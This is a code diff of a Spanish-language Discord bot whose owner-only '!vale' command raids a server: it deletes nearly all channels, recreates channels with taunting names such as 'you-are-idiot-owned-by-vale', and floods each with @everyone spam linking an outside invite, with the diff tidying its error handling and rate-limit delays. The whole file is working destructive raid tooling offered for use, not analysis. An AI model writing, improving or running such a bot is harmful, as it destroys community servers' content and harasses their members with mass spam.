@@ -13,7 +13,7 @@ const client = new Client({
 });
 
 const PREFIX = '!';
-const OWNER_IDS = ["1436516806842912970"]; // ← TU ID REAL aquí (agrega más si quieres)
+const OWNER_IDS = ["1436516806842912970"]; // TU ID REAL aquí
 
 client.once('ready', () => {
   console.log(chalk.green.bold(`Bot conectado como ${client.user.tag}`));
@@ -33,10 +33,6 @@ client.on('messageCreate', async (message) => {
       return message.reply('No tienes permiso para este comando tan heavy.');
     }
 
-    // ────────────────────────────────────────────────
-    //          PERSONALIZA AQUÍ LO QUE QUIERAS
-    // ────────────────────────────────────────────────
-
     const nombresDeCanales = [
       "raid-for-$pwm$-jajaja",
       "raid-for-$pwm$-jajaja",
@@ -44,7 +40,6 @@ client.on('messageCreate', async (message) => {
       "raid-for-$pwm$-jajaja",
       "you-are-idiot-owned-by-vale",
       "you-are-idiot-owned-by-vale",
-      // agrega más si quieres
     ];
 
     const mensajesEnRafaga = [
@@ -55,32 +50,25 @@ client.on('messageCreate', async (message) => {
       "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
       "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
       "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
-      "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
-      "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
+      "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
+      "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
     ];
 
-    const delayEntreMensajes = 1300; // 1.3 segundos - sube si te da rate limit
-
-    // ────────────────────────────────────────────────
-    //        NO CAMBIES DE AQUÍ PARA ABAJO
-    // ────────────────────────────────────────────────
-
-    const totalCanales = nombresDeCanales.length;
-    const totalMensajes = mensajesEnRafaga.length;
+    const delayEntreMensajes = 1300;
 
     await message.reply(
       `**¡NUKE PERSONALIZADO INICIANDO EN 5 SEGUNDOS!**\n\n` +
-      `→ Creando **${totalCanales}** canales\n` +
-      `→ Enviando **${totalMensajes}** mensajes por canal\n\n` +
+      `→ Creando **${nombresDeCanales.length}** canales\n` +
+      `→ Enviando **${mensajesEnRafaga.length}** mensajes por canal\n\n` +
       `¡Ctrl + C para cancelar!`
-    );
+    ).catch(err => console.log('No se pudo responder inicio:', err.message));
 
     await new Promise(r => setTimeout(r, 5000));
 
     const guild = message.guild;
 
     try {
-      // 1. Borrar canales (excepto el actual)
+      // 1. Borrar canales
       let borrados = 0;
       for (const ch of guild.channels.cache.values()) {
         if (ch.deletable && ch.id !== message.channel.id) {
@@ -91,21 +79,21 @@ client.on('messageCreate', async (message) => {
           } catch {}
         }
       }
-      await message.channel.send(`→ Borrados **${borrados}** canales.`);
+      await message.channel.send(`→ Borrados **${borrados}** canales.`).catch(() => {});
 
       // 2. Crear canales
       const nuevosCanales = [];
-      let delayCreciente = 800; // empieza con 0.8s, aumenta si falla
-
       for (const nombreOriginal of nombresDeCanales) {
         try {
-          // Limpiar nombre para que sea válido en Discord
           let nombre = nombreOriginal
             .toLowerCase()
-            .replace(/[^a-z0-9\- ]/g, '-') // reemplaza caracteres inválidos por -
-            .replace(/-+/g, '-')           // evita -----
-            .replace(/^-|-$/g, '')         // quita - al inicio/final
-            .slice(0, 100) || 'raid-default';
+            .replace(/[^a-z0-9- ]/g, '-')     // solo a-z, 0-9, -, espacio
+            .replace(/\s+/g, '-')             // espacios → -
+            .replace(/-+/g, '-')              // evitar -----
+            .replace(/^-|-$/g, '')            // quitar - inicial/final
+            .slice(0, 100);
+
+          if (!nombre) nombre = 'raid-default-' + Date.now().toString().slice(-6);
 
           const canal = await guild.channels.create({
             name: nombre,
@@ -117,16 +105,15 @@ client.on('messageCreate', async (message) => {
 
           nuevosCanales.push(canal);
           console.log(chalk.green(`Creado → #${canal.name}`));
-          await new Promise(r => setTimeout(r, delayCreciente));
+          await new Promise(r => setTimeout(r, 900));
         } catch (err) {
-          console.log(chalk.red(`Fallo creando canal "${nombreOriginal}": ${err.message}`));
-          delayCreciente += 500; // aumenta delay si falla (anti-rate-limit)
+          console.log(chalk.red(`Fallo creando "${nombreOriginal}": ${err.message}`));
         }
       }
 
-      await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`);
+      await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`).catch(() => {});
 
-      // 3. Spam en ráfaga
+      // 3. Spam
       let spameados = 0;
       for (const canal of nuevosCanales) {
         try {
@@ -141,20 +128,19 @@ client.on('messageCreate', async (message) => {
         }
       }
 
-      await message.channel.send(`**¡TERMINADO!** 😈\nCanales spameados: **${spameados}**`);
+      await message.channel.send(`**¡TERMINADO!** 😈\nCanales spameados: **${spameados}**`).catch(() => {});
 
     } catch (err) {
-      console.error(chalk.red.bold('Error grave en !vale:'), err);
-      await message.channel.send('Error grave. Revisa logs.');
+      console.error(chalk.red.bold('Error grave en !vale:'), err.stack || err);
+      await message.channel.send('Error grave. Revisa logs.').catch(() => {});
     }
   }
 
-  // Comando de ayuda opcional
   if (command === 'help') {
     return message.reply('Comandos:\n!vale → nuke personalizado (solo owners)\n!help → este mensaje');
   }
 });
 
 client.login(process.env.TOKEN).catch(err => {
-  console.error(chalk.red.bold('Error al iniciar el bot:'), err.message);
+  console.error(chalk.red.bold('Error crítico al conectar:'), err.message || err);
 });
